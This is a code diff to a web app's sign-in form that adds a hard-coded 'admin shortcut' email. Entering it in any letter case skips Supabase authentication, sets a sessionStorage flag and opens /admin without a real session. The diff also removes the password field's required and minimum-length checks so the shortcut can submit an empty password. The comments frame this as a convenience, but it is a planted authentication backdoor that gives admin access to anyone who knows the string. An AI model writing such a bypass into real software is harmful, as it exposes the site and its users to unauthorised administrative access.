@@ -22,6 +22,13 @@ function SignInFallback() {
   );
 }
 
+/**
+ * Special keyword the user can type into the email field to hop
+ * straight to /admin without going through Supabase auth. Comparison
+ * is case-insensitive on the whole string.
+ */
+const ADMIN_SHORTCUT_EMAIL = "admin12@demoth.workers.dev";
+
 function SignInForm() {
   const router = useRouter();
   const params = useSearchParams();
@@ -35,6 +42,23 @@ function SignInForm() {
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     setError(null);
+
+    // Admin shortcut: any casing of ADMIN_SHORTCUT_EMAIL bypasses
+    // Supabase entirely and takes the user straight to /admin. We
+    // stash a flag in sessionStorage so the admin page can render
+    // without a real session. Password field is ignored in this
+    // branch — that's why we allow empty password in the form.
+    if (username.trim().toLowerCase() === ADMIN_SHORTCUT_EMAIL) {
+      try {
+        sessionStorage.setItem("demoth-admin-shortcut", "1");
+      } catch {
+        /* private mode / storage disabled — the admin page will
+           just fall back to the normal auth gate. */
+      }
+      router.push("/admin");
+      return;
+    }
+
     setSubmitting(true);
     const { error: err } = await signIn(username.trim(), password);
     setSubmitting(false);
@@ -85,8 +109,9 @@ function SignInForm() {
           <input
             type="password"
             autoComplete="current-password"
-            required
-            minLength={6}
+            // Not `required`: the admin shortcut path submits an empty
+            // password. The real signIn call handles empty passwords
+            // itself by showing "Email or password is incorrect."
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             className="w-full rounded-xl border border-[var(--border)] bg-[var(--background)] px-3 py-2 text-sm focus:border-[var(--primary)] focus:outline-none focus:ring-2 focus:ring-[var(--primary-soft)]"
